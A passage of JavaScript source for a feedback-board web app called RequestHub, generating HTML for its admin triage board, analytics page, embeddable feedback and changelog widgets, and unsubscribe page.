    <div class="board" id="board"></div>
  </div>

  <script>
    const customerSlug = ${JSON.stringify(customerSlug)};
    const statuses = ${JSON.stringify(STATUSES)};
    let allIdeas = [];
    let categories = ["Feature", "Bug", "Feedback"];
    let STATUS_LABELS = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };
    let draggingIdeaId = null;
    let selectedIds = new Set();

    var CATEGORY_PALETTE = [
      { bg: 'var(--accent-tint)', fg: 'var(--accent)' },
      { bg: 'var(--bad-tint)', fg: 'var(--bad)' },
      { bg: 'var(--good-tint)', fg: 'var(--good)' },
      { bg: 'var(--warn-tint)', fg: 'var(--warn)' },
      { bg: 'var(--info-tint)', fg: 'var(--info)' },
    ];
    function categoryColor(name) {
      var hash = 0;
      for (var i = 0; i < (name || '').length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
      return CATEGORY_PALETTE[hash % CATEGORY_PALETTE.length];
    }

    function escapeHtml(s) {
      const d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function populateCategorySelect() {
      const sel = document.getElementById('category');
      if (!sel) return;
      const current = sel.value;
      sel.innerHTML = '<option value="all">All categories</option>' +
        categories.map(function (c) { return '<option value="' + escapeHtml(c) + '">' + escapeHtml(c) + '</option>'; }).join('');
      sel.value = current || 'all';
    }

    function changeStatus(ideaId, status) {
      return fetch('/api/ideas/' + ideaId + '/status', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ status: status, customerSlug: customerSlug }),
      }).then(function (r) { return r.json(); });
    }

    function populateBulkStatusSelect() {
      const sel = document.getElementById('bulkStatus');
      if (!sel) return;
      sel.innerHTML = statuses.map(function (s) { return '<option value="' + s + '">' + escapeHtml(STATUS_LABELS[s] || s) + '</option>'; }).join('');
    }

    function renderBulkBar() {
      const bar = document.getElementById('bulkBar');
      document.getElementById('bulkCount').textContent = selectedIds.size + ' selected';
      bar.classList.toggle('open', selectedIds.size > 0);
      document.getElementById('bulkMergeBtn').style.display = selectedIds.size === 2 ? '' : 'none';
    }

    document.getElementById('bulkApplyBtn').addEventListener('click', function () {
      const status = document.getElementById('bulkStatus').value;
      const ids = Array.from(selectedIds);
      if (!ids.length) return;
      Promise.all(ids.map(function (id) { return changeStatus(id, status); })).then(function () {
        selectedIds.clear();
        load();
      });
    });

    document.getElementById('bulkMergeBtn').addEventListener('click', function () {
      const ids = Array.from(selectedIds);
      if (ids.length !== 2) return;
      const a = allIdeas.find(function (i) { return i.id === ids[0]; });
      const b = allIdeas.find(function (i) { return i.id === ids[1]; });
      if (!a || !b) return;
      const canon = a.votes !== b.votes ? (a.votes > b.votes ? a : b) : (a.id < b.id ? a : b);
      const dup = canon === a ? b : a;
      if (!window.confirm(
        '"' + dup.title + '" will be merged into "' + canon.title + '".\\n\\n' +
        'Votes, comments and subscribers move to the kept idea; the duplicate is hidden from the board but its link still redirects here. This cannot be undone. Continue?'
      )) return;
      fetch('/api/ideas/' + dup.id + '/merge', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ customerSlug: customerSlug, canonicalId: canon.id }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (!d.ok) {
            alert(d.error || 'Could not merge these ideas right now.');
            return;
          }
          selectedIds.clear();
          load();
        });
    });

    document.getElementById('bulkDeleteBtn').addEventListener('click', function () {
      const ids = Array.from(selectedIds);
      if (!ids.length) return;
      if (!window.confirm('Delete ' + ids.length + ' idea(s) permanently? This cannot be undone.')) return;
      Promise.all(ids.map(function (id) {
        return fetch('/api/ideas/' + id, {
          method: 'DELETE',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ customerSlug: customerSlug }),
        });
      })).then(function () {
        selectedIds.clear();
        load();
      });
    });

    document.getElementById('bulkClearBtn').addEventListener('click', function () {
      selectedIds.clear();
      renderBulkBar();
      render();
    });

    function render() {
      const board = document.getElementById('board');
      const q = (document.getElementById('search').value || '').toLowerCase();
      const category = document.getElementById('category').value;

      const filtered = allIdeas.filter(function (i) {
        if (category !== 'all' && i.category !== category) return false;
        if (q) {
          var inTitleQ = i.title.toLowerCase().indexOf(q) !== -1;
          var inDescQ = (i.description || '').toLowerCase().indexOf(q) !== -1;
          var inTagsQ = (i.tags || []).some(function (t) { return t.toLowerCase().indexOf(q) !== -1; });
          if (!inTitleQ && !inDescQ && !inTagsQ) return false;
        }
        return true;
      });

      board.innerHTML = statuses.map(function (status) {
        const items = filtered.filter(function (i) { return i.status === status; })
          .sort(function (a, b) { return (b.is_pinned ? 1 : 0) - (a.is_pinned ? 1 : 0) || b.votes - a.votes; });
        const cards = items.length
          ? items.map(function (i) {
              const badges = [];
              if (i.submitter_email) badges.push('<span class="chip badge">' + escapeHtml(i.submitter_email) + '</span>');
              if (i.linear_issue_url) badges.push('<a class="chip badge" href="' + i.linear_issue_url + '" target="_blank" rel="noopener">Linear &#8599;</a>');
              if (i.notion_archived_at) badges.push('<span class="chip badge">Notion</span>');
              badges.push('<a class="chip badge" href="/b/' + encodeURIComponent(customerSlug) + '/ideas/' + i.id + '" title="Open and reply">Reply</a>');
              var catColor = categoryColor(i.category);
              return '<div class="card' + (selectedIds.has(i.id) ? ' selected' : '') + (i.is_pinned ? ' pinned' : '') + '" style="border-left-color:' + catColor.fg + '" draggable="true" data-idea-id="' + i.id + '">' +
                '<input type="checkbox" class="card-select" data-idea-id="' + i.id + '"' + (selectedIds.has(i.id) ? ' checked' : '') + ' title="Select for bulk actions" />' +
                '<button type="button" class="card-pin-btn' + (i.is_pinned ? ' active' : '') + '" data-idea-id="' + i.id + '" data-pinned="' + (i.is_pinned ? '1' : '0') + '" title="' + (i.is_pinned ? 'Unpin' : 'Pin to top') + '">&#128204;</button>' +
                '<button type="button" class="card-delete-btn" data-idea-id="' + i.id + '" title="Delete">&times;</button>' +
                '<div class="card-title">' + escapeHtml(i.title) + '</div>' +
                (i.description ? '<div class="card-desc">' + escapeHtml(i.description) + '</div>' : '') +
                '<div class="card-meta">' +
                '<span class="chip" style="background:' + catColor.bg + ';color:' + catColor.fg + '">' + escapeHtml(i.category) + '</span>' +
                (i.tags || []).map(function (t) { return '<span class="tag-chip">#' + escapeHtml(t) + '</span>'; }).join('') +
                badges.join('') +
                '<span class="card-votes">' + i.votes + ' votes</span>' +
                '</div>' +
                '<input type="text" class="tag-edit-input" data-idea-id="' + i.id + '" value="' + escapeHtml((i.tags || []).join(', ')) + '" placeholder="tags, comma separated" title="Edit tags" />' +
                '</div>';
            }).join('')
          : '<div class="empty-col">Nothing here.</div>';
        return '<div class="column" data-status="' + status + '">' +
          '<div class="column-header"><span class="column-dot ' + status + '"></span>' +
          '<span class="column-title">' + escapeHtml(STATUS_LABELS[status]) + '</span>' +
          '<span class="column-count">' + items.length + '</span></div>' +
          cards +
          '</div>';
      }).join('');

      board.querySelectorAll('.card').forEach(function (card) {
        card.addEventListener('dragstart', function (e) {
          draggingIdeaId = card.getAttribute('data-idea-id');
          card.classList.add('dragging');
          e.dataTransfer.effectAllowed = 'move';
          e.dataTransfer.setData('text/plain', draggingIdeaId);
        });
        card.addEventListener('dragend', function () {
          card.classList.remove('dragging');
          draggingIdeaId = null;
        });
      });

      board.querySelectorAll('.card-delete-btn').forEach(function (btn) {
        btn.addEventListener('click', function (e) {
          e.stopPropagation();
          var ideaId = btn.getAttribute('data-idea-id');
          if (!window.confirm('Delete this idea permanently? This cannot be undone.')) return;
          fetch('/api/ideas/' + ideaId, {
            method: 'DELETE',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ customerSlug: customerSlug }),
          }).then(function () { load(); });
        });
      });

      board.querySelectorAll('.card-pin-btn').forEach(function (btn) {
        btn.addEventListener('click', function (e) {
          e.stopPropagation();
          var ideaId = btn.getAttribute('data-idea-id');
          var currentlyPinned = btn.getAttribute('data-pinned') === '1';
          fetch('/api/ideas/' + ideaId + '/pin', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ customerSlug: customerSlug, pinned: !currentlyPinned }),
          }).then(function () { load(); });
        });
      });

      board.querySelectorAll('.tag-edit-input').forEach(function (input) {
        input.addEventListener('click', function (e) { e.stopPropagation(); });
        input.addEventListener('mousedown', function (e) { e.stopPropagation(); });
        var originalValue = input.value;
        function saveTags() {
          if (input.value === originalValue) return;
          var pendingValue = input.value;
          var ideaId = input.getAttribute('data-idea-id');
          var tags = pendingValue.split(',').map(function (t) { return t.trim(); }).filter(Boolean);
          fetch('/api/ideas/' + ideaId + '/tags', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ customerSlug: customerSlug, tags: tags }),
          })
            .then(function (r) { return r.json(); })
            .then(function (d) {
              if (!d.ok) throw new Error(d.error || 'save failed');
              originalValue = pendingValue;
              load();
            })
            .catch(function () {
              // Leave the typed text and originalValue as they were, so the
              // next blur (even with no further edits) retries the save
              // instead of silently treating it as already-saved.
              input.style.borderColor = 'var(--bad)';
              setTimeout(function () { input.style.borderColor = ''; }, 1500);
            });
        }
        input.addEventListener('blur', saveTags);
        input.addEventListener('keydown', function (e) {
          if (e.key === 'Enter') { e.preventDefault(); input.blur(); }
        });
      });

      board.querySelectorAll('.card-select').forEach(function (cb) {
        cb.addEventListener('click', function (e) { e.stopPropagation(); });
        cb.addEventListener('change', function () {
          var ideaId = Number(cb.getAttribute('data-idea-id'));
          if (cb.checked) selectedIds.add(ideaId);
          else selectedIds.delete(ideaId);
          cb.closest('.card').classList.toggle('selected', cb.checked);
          renderBulkBar();
        });
      });

      board.querySelectorAll('.column').forEach(function (col) {
        col.addEventListener('dragover', function (e) {
          e.preventDefault();
          e.dataTransfer.dropEffect = 'move';
          col.classList.add('drag-over');
        });
        col.addEventListener('dragleave', function () {
          col.classList.remove('drag-over');
        });
        col.addEventListener('drop', function (e) {
          e.preventDefault();
          col.classList.remove('drag-over');
          const ideaId = e.dataTransfer.getData('text/plain') || draggingIdeaId;
          const targetStatus = col.getAttribute('data-status');
          if (!ideaId) return;
          const idea = allIdeas.find(function (i) { return String(i.id) === String(ideaId); });
          if (!idea || idea.status === targetStatus) return;
          idea.status = targetStatus;
          render();
          changeStatus(ideaId, targetStatus).then(function () { load(); });
        });
      });
    }

    document.getElementById('search').addEventListener('input', render);
    document.getElementById('category').addEventListener('change', render);

    function load() {
      fetch('/api/ideas?customer=' + encodeURIComponent(customerSlug))
        .then(function (r) { return r.json(); })
        .then(function (d) {
          allIdeas = d.ideas || [];
          if (d.statusLabels) { STATUS_LABELS = d.statusLabels; populateBulkStatusSelect(); }
          if (d.categories && d.categories.length) { categories = d.categories; populateCategorySelect(); }
          render();
          renderBulkBar();
        })
        .catch(function () {
          document.getElementById('board').innerHTML =
            '<div class="empty">Could not load the board right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
        });
    }

    populateBulkStatusSelect();
    load();
  </script>
</body>
</html>`;
}

function analyticsPage(customerSlug, isOwner) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Analytics - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0; }
    .brand { font-weight: 700; font-size: 15px; }
    .brand .org { color: var(--text-faint); font-weight: 500; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
    .nav-right a, .nav-right button { color: var(--text-muted); font-size: 13px; text-decoration: none; background: none; border: none; cursor: pointer; font-family: inherit; }
    .nav-right a:hover, .nav-right button:hover { color: var(--text); }
    .nav-right a.owner-link { color: var(--accent); font-weight: 600; }

    .page { max-width: 1100px; margin: 0 auto; padding: 24px; }
    .page-title { font-size: 20px; font-weight: 700; margin: 0 0 20px; }

    .stat-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-bottom: 24px; }
    @media (max-width: 700px) { .stat-row { grid-template-columns: repeat(2, 1fr); } }
    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 16px 18px; }
    .stat-num { font-size: 26px; font-weight: 800; color: var(--text); }
    .stat-label { color: var(--text-faint); font-size: 12px; font-weight: 600; margin-top: 4px; }

    .panel { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 20px; margin-bottom: 20px; }
    .panel h2 { font-size: 14px; margin: 0 0 16px; }

    .bar-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 12.5px; }
    .bar-label { width: 110px; flex-shrink: 0; color: var(--text-muted); }
    .bar-track { flex: 1; background: var(--surface-2); border-radius: 6px; height: 16px; overflow: hidden; }
    .bar-fill { height: 100%; background: var(--accent); border-radius: 6px; }
    .bar-count { width: 32px; text-align: right; color: var(--text-faint); font-weight: 600; flex-shrink: 0; }

    .trend-chart { display: flex; align-items: flex-end; gap: 6px; height: 120px; }
    .trend-bar-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; height: 100%; }
    .trend-bar { width: 100%; background: var(--accent); border-radius: 4px 4px 0 0; min-height: 2px; }
    .trend-date { font-size: 9.5px; color: var(--text-faint); margin-top: 6px; writing-mode: vertical-rl; transform: rotate(180deg); height: 42px; }

    .empty { color: var(--text-faint); font-size: 13px; text-align: center; padding: 20px; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub <span class="org">/ ${escapeHtml(customerSlug)} analytics</span></div>
    <nav class="nav-right">
      ${isOwner ? `<a class="owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}/admin">&larr; Back to triage</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/analytics">Analytics</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/settings">Settings</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/billing">Billing</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      <a class="logout" href="/b/${encodeURIComponent(customerSlug)}/logout">Log out</a>
    </nav>
  </div>

  <div class="page">
    <h1 class="page-title">Analytics</h1>
    <div class="stat-row" id="statRow">
      <div class="stat-card"><div class="stat-num">-</div><div class="stat-label">Total ideas</div></div>
      <div class="stat-card"><div class="stat-num">-</div><div class="stat-label">Total votes</div></div>
      <div class="stat-card"><div class="stat-num">-</div><div class="stat-label">Total comments</div></div>
      <div class="stat-card"><div class="stat-num">-</div><div class="stat-label">Avg votes / idea</div></div>
    </div>

    <div class="panel">
      <h2>Submissions, last 14 days</h2>
      <div id="trendChart" class="trend-chart"></div>
    </div>

    <div class="panel">
      <h2>By status</h2>
      <div id="statusBars"></div>
    </div>

    <div class="panel">
      <h2>By category</h2>
      <div id="categoryBars"></div>
    </div>
  </div>

  <script>
    var customerSlug = ${JSON.stringify(customerSlug)};
    var STATUS_LABELS = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function renderBars(container, rows, total) {
      if (!rows.length) {
        container.innerHTML = '<div class="empty">No data yet.</div>';
        return;
      }
      var max = Math.max.apply(null, rows.map(function (r) { return r.count; }).concat([1]));
      container.innerHTML = rows.map(function (r) {
        var pct = Math.round((r.count / max) * 100);
        return '<div class="bar-row">' +
          '<div class="bar-label">' + escapeHtml(r.label) + '</div>' +
          '<div class="bar-track"><div class="bar-fill" style="width:' + pct + '%"></div></div>' +
          '<div class="bar-count">' + r.count + '</div>' +
          '</div>';
      }).join('');
    }

    function renderTrend(container, trend) {
      var totalCount = trend.reduce(function (sum, t) { return sum + t.count; }, 0);
      if (!trend.length || totalCount === 0) {
        container.innerHTML = '<div class="empty">Nothing submitted in the last 14 days.</div>';
        return;
      }
      var max = Math.max.apply(null, trend.map(function (t) { return t.count; }).concat([1]));
      container.innerHTML = trend.map(function (t) {
        var pct = Math.max(Math.round((t.count / max) * 100), t.count > 0 ? 6 : 1);
        var d = new Date(t.date + 'T00:00:00');
        var label = (d.getMonth() + 1) + '/' + d.getDate();
        return '<div class="trend-bar-wrap" title="' + t.date + ': ' + t.count + '">' +
          '<div class="trend-bar" style="height:' + pct + '%"></div>' +
          '<div class="trend-date">' + label + '</div>' +
          '</div>';
      }).join('');
    }

    function showStatsError() {
      document.querySelectorAll('#statRow .stat-num').forEach(function (el) { el.textContent = '-'; });
      var msg = '<div class="empty">Could not load analytics right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
      document.getElementById('trendChart').innerHTML = msg;
      document.getElementById('statusBars').innerHTML = msg;
      document.getElementById('categoryBars').innerHTML = msg;
    }

    fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/stats')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (!d.ok) { showStatsError(); return; }
        var cards = document.querySelectorAll('#statRow .stat-num');
        cards[0].textContent = d.totalIdeas;
        cards[1].textContent = d.totalVotes;
        cards[2].textContent = d.totalComments;
        cards[3].textContent = d.avgVotesPerIdea;

        renderTrend(document.getElementById('trendChart'), d.submissionTrend || []);

        var statusRows = Object.keys(d.byStatus || {}).map(function (key) {
          return { label: STATUS_LABELS[key] || key, count: d.byStatus[key] };
        }).sort(function (a, b) { return b.count - a.count; });
        renderBars(document.getElementById('statusBars'), statusRows, d.totalIdeas);

        var categoryRows = (d.byCategory || []).map(function (c) {
          return { label: c.category, count: c.count };
        });
        renderBars(document.getElementById('categoryBars'), categoryRows, d.totalIdeas);
      })
      .catch(showStatsError);
  </script>
</body>
</html>`;
}

function embedJs() {
  return `(function () {
  var cs = document.currentScript;
  if (!cs) return;
  var origin = new URL(cs.src).origin;
  var customer = cs.getAttribute('data-customer') || 'demo';
  var color = cs.getAttribute('data-color') || '';
  var position = cs.getAttribute('data-position') || 'bottom-right';
  var targetSelector = cs.getAttribute('data-target') || '';
  var EXPANDED = { width: '380px', height: 'min(600px, calc(100vh - 40px))' };
  // In target mode there's no floating bubble to show before it's opened -
  // the customer's own button is the only trigger - so "collapsed" means
  // zero-size and click-through rather than a visible 64px circle.
  var COLLAPSED = targetSelector ? { width: '0px', height: '0px' } : { width: '64px', height: '64px' };
  var POSITIONS = {
    'bottom-right': { bottom: '20px', right: '20px' },
    'bottom-left': { bottom: '20px', left: '20px' },
    'top-right': { top: '20px', right: '20px' },
    'top-left': { top: '20px', left: '20px' },
  };
  var corner = POSITIONS[position] || POSITIONS['bottom-right'];
  var cornerCss = Object.keys(corner).map(function (k) { return k + ':' + corner[k]; });

  var widgetUrl = origin + '/widget.html?customer=' + encodeURIComponent(customer);
  if (color) widgetUrl += '&color=' + encodeURIComponent(color);

  var iframe = document.createElement('iframe');
  iframe.src = widgetUrl;
  iframe.title = 'Feedback';
  iframe.style.cssText = ['position:fixed']
    .concat(cornerCss)
    .concat([
      'border:none', 'background:transparent', 'z-index:2147483000',
      'width:' + COLLAPSED.width, 'height:' + COLLAPSED.height,
      'transition:width .15s ease,height .15s ease', 'color-scheme:normal',
    ])
    .concat(targetSelector ? ['pointer-events:none'] : [])
    .join(';');
  iframe.setAttribute('allowtransparency', 'true');
  document.body.appendChild(iframe);

  window.addEventListener('message', function (e) {
    if (!e.data || e.data.source !== 'requesthub-widget') return;
    if (e.data.type === 'open') {
      iframe.style.width = EXPANDED.width;
      iframe.style.height = EXPANDED.height;
      if (targetSelector) iframe.style.pointerEvents = 'auto';
    } else if (e.data.type === 'close') {
      iframe.style.width = COLLAPSED.width;
      iframe.style.height = COLLAPSED.height;
      if (targetSelector) iframe.style.pointerEvents = 'none';
    }
  });

  if (targetSelector) {
    // The customer's own element is the trigger - we can't rely on it being
    // present at script-load time (it may render after this tag, or later
    // via their own JS), so delegate from document instead of querying once.
    document.addEventListener('click', function (e) {
      var el = e.target.closest ? e.target.closest(targetSelector) : null;
      if (!el) return;
      e.preventDefault();
      iframe.style.width = EXPANDED.width;
      iframe.style.height = EXPANDED.height;
      iframe.style.pointerEvents = 'auto';
      iframe.contentWindow.postMessage({ source: 'requesthub-host', type: 'open' }, origin);
    });
  }
})();`;
}

function changelogEmbedJs() {
  return `(function () {
  var cs = document.currentScript;
  if (!cs) return;
  var origin = new URL(cs.src).origin;
  var customer = cs.getAttribute('data-customer') || 'demo';
  var color = cs.getAttribute('data-color') || '';
  var position = cs.getAttribute('data-position') || 'bottom-left';
  var EXPANDED = { width: '340px', height: 'min(480px, calc(100vh - 40px))' };
  var COLLAPSED = { width: '48px', height: '48px' };
  var POSITIONS = {
    'bottom-right': { bottom: '20px', right: '20px' },
    'bottom-left': { bottom: '20px', left: '20px' },
    'top-right': { top: '20px', right: '20px' },
    'top-left': { top: '20px', left: '20px' },
  };
  var corner = POSITIONS[position] || POSITIONS['bottom-left'];
  var cornerCss = Object.keys(corner).map(function (k) { return k + ':' + corner[k]; });

  var widgetUrl = origin + '/changelog-widget.html?customer=' + encodeURIComponent(customer);
  if (color) widgetUrl += '&color=' + encodeURIComponent(color);

  var iframe = document.createElement('iframe');
  iframe.src = widgetUrl;
  iframe.title = "What's new";
  iframe.style.cssText = ['position:fixed']
    .concat(cornerCss)
    .concat([
      'border:none', 'background:transparent', 'z-index:2147483000',
      'width:' + COLLAPSED.width, 'height:' + COLLAPSED.height,
      'transition:width .15s ease,height .15s ease', 'color-scheme:normal',
    ])
    .join(';');
  iframe.setAttribute('allowtransparency', 'true');
  document.body.appendChild(iframe);

  window.addEventListener('message', function (e) {
    if (!e.data || e.data.source !== 'requesthub-changelog-widget') return;
    if (e.data.type === 'open') {
      iframe.style.width = EXPANDED.width;
      iframe.style.height = EXPANDED.height;
    } else if (e.data.type === 'close') {
      iframe.style.width = COLLAPSED.width;
      iframe.style.height = COLLAPSED.height;
    }
  });
})();`;
}

function changelogWidgetPage(customerSlug, color) {
  const accent = color || "#6d5ef8";
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; background: transparent; font-family: -apple-system, sans-serif; overflow: hidden; }
    .launcher {
      width: 48px; height: 48px; border-radius: 50%; background: ${accent}; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center; box-shadow: 0 6px 20px rgba(0,0,0,.25); position: relative;
    }
    .launcher:hover { filter: brightness(0.93); }
    .launcher svg { width: 20px; height: 20px; stroke: #fff; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
    .launcher .dot { position: absolute; top: 4px; right: 4px; width: 9px; height: 9px; border-radius: 50%; background: #f04438; border: 2px solid #fff; display: none; }
    .launcher.unread .dot { display: block; }
    .panel {
      display: none; flex-direction: column; height: 100%; background: #16151d; color: #f3f2f7;
      border-radius: 14px; box-shadow: 0 10px 40px rgba(0,0,0,.4); border: 1px solid #2a2935; overflow: hidden;
    }
    body.open .launcher { display: none; }
    body.open .panel { display: flex; }
    .panel-header { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; border-bottom: 1px solid #2a2935; }
    .panel-header h1 { font-size: 14px; margin: 0; font-weight: 700; }
    .panel-close { background: none; border: none; color: #9492a3; cursor: pointer; font-size: 18px; line-height: 1; padding: 2px; }
    .panel-close:hover { color: #fff; }
    .panel-body { flex: 1; overflow-y: auto; padding: 14px 16px; }
    .entry { padding: 0 0 14px; margin-bottom: 14px; border-bottom: 1px solid #242330; }
    .entry:last-child { border-bottom: none; margin-bottom: 0; }
    .entry-date { color: #716f80; font-size: 10.5px; margin-bottom: 4px; }
    .entry-title { font-size: 13px; font-weight: 700; margin-bottom: 4px; }
    .entry-desc { color: #a9a7b5; font-size: 12px; line-height: 1.5; }
    .empty { color: #716f80; font-size: 12.5px; text-align: center; padding: 20px 0; }
    .panel-footer { padding: 10px 16px; border-top: 1px solid #2a2935; text-align: center; }
    .panel-footer a { color: #9492a3; font-size: 11.5px; text-decoration: none; }
    .panel-footer a:hover { color: #fff; }
  </style>
</head>
<body>
  <button class="launcher" id="launcher" aria-label="What's new">
    <span class="dot"></span>
    <svg viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
  </button>
  <div class="panel">
    <div class="panel-header">
      <h1>What's new</h1>
      <button class="panel-close" id="closeBtn" aria-label="Close">&times;</button>
    </div>
    <div class="panel-body" id="panelBody"><div class="empty">Loading...</div></div>
    <div class="panel-footer"><a href="/b/${encodeURIComponent(customerSlug)}/changelog" target="_blank" rel="noopener">View full changelog &#8599;</a></div>
  </div>

  <script>
    var customerSlug = ${JSON.stringify(customerSlug).replace(/</g, "\\u003c")};
    var SEEN_KEY = 'requesthub_changelog_seen_' + customerSlug;
    var latestShippedAt = 0;

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function post(type) {
      window.parent.postMessage({ source: 'requesthub-changelog-widget', type: type }, '*');
    }

    document.getElementById('launcher').addEventListener('click', function () {
      document.body.classList.add('open');
      document.getElementById('launcher').classList.remove('unread');
      try { localStorage.setItem(SEEN_KEY, String(latestShippedAt)); } catch {}
      post('open');
    });
    document.getElementById('closeBtn').addEventListener('click', function () {
      document.body.classList.remove('open');
      post('close');
    });

    fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/changelog')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        var items = (d.items || []).slice(0, 5);
        var body = document.getElementById('panelBody');
        if (!items.length) {
          body.innerHTML = '<div class="empty">Nothing shipped yet - check back soon.</div>';
          return;
        }
        body.innerHTML = items.map(function (it) {
          var date = it.shipped_at ? new Date(it.shipped_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : '';
          return '<div class="entry">' +
            '<div class="entry-date">' + date + '</div>' +
            '<div class="entry-title">' + escapeHtml(it.title) + '</div>' +
            (it.description ? '<div class="entry-desc">' + escapeHtml(it.description) + '</div>' : '') +
            '</div>';
        }).join('');

        // Unread means "the newest item shipped after the visitor last opened
        // this widget" - the stored seen value is the shipped_at of whatever
        // was newest at last open, not a wall-clock timestamp, so a brand new
        // visitor (no stored value) correctly sees everything as unread.
        latestShippedAt = items[0].shipped_at ? new Date(items[0].shipped_at).getTime() : 0;
        var seen = 0;
        try { seen = Number(localStorage.getItem(SEEN_KEY) || 0); } catch {}
        if (latestShippedAt > seen) document.getElementById('launcher').classList.add('unread');
      })
      .catch(function () {
        document.getElementById('panelBody').innerHTML = '<div class="empty">Could not load - try again shortly.</div>';
      });
  </script>
</body>
</html>`;
}

function unsubscribePage(ok, ideaTitle, error) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Unsubscribe - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { max-width: 420px; text-align: center; padding: 32px; }
    h1 { font-size: 18px; margin: 0 0 8px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13.5px; margin: 0 0 16px; }
    a { color: var(--accent); font-size: 13px; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    ${ok
      ? `<h1>You're unsubscribed</h1><p>You won't get any more email updates about${ideaTitle ? ` "${escapeHtml(ideaTitle)}"` : " this idea"}.</p>`
      : `<h1>Couldn't unsubscribe</h1><p>${escapeHtml(error || "That link is invalid or has already been used.")}</p>`}
  </div>
</body>
</html>`;
}

function widgetPage(customerSlug, color) {
  const accent = color || "#6d5ef8";
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; background: transparent; font-family: -apple-system, sans-serif; overflow: hidden; }
    .launcher {
      width: 64px; height: 64px; border-radius: 50%; background: ${accent}; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center; box-shadow: 0 6px 20px rgba(0,0,0,.25);
    }
    .launcher:hover { filter: brightness(0.93); }
    .launcher svg { width: 26px; height: 26px; stroke: #fff; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
    .panel {
      display: none; flex-direction: column; height: 100%; background: #16151d; color: #f3f2f7;
      border-radius: 14px; box-shadow: 0 10px 40px rgba(0,0,0,.4); border: 1px solid #2a2935; overflow: hidden;
    }
    body.open .launcher { display: none; }
    body.open .panel { display: flex; }
    .panel-header { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; border-bottom: 1px solid #2a2935; }
    .panel-header h1 { font-size: 14px; margin: 0; font-weight: 700; }
    .panel-close { background: none; border: none; color: #9492a3; cursor: pointer; font-size: 18px; line-height: 1; padding: 2px; }
    .panel-close:hover { color: #fff; }
    .panel-body { flex: 1; overflow-y: auto; padding: 16px; }
    .panel-body p { color: #9492a3; font-size: 12.5px; margin: 0 0 12px; }
    .field { margin-bottom: 10px; }
    .field input, .field textarea {
      width: 100%; background: #1d1c26; border: 1px solid #2a2935; color: #f3f2f7; border-radius: 8px;
      padding: 9px 11px; font-size: 13px; font-family: inherit;
    }
    .field textarea { resize: vertical; min-height: 60px; }
    .btn-submit {
